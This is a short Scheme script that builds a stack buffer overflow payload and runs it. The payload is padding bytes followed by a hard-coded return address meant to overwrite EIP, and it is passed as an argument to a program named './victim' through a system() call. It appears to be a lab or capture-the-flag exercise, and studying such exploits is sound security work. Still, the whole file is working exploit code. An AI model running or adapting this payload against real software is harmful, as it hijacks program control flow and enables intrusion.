(setlocale LC_ALL "en_US.iso88591")
(define eip_addr "\x82\x84\x04\x08")

(define code (lambda ()
               (string-append "./victim "
                              (make-string 10 #\x41)
                              (make-string 4 #\x42)
                              (make-string 4 #\x43)
                              eip_addr)))
  
(define str (code))
(display str)
(newline)
(system str)
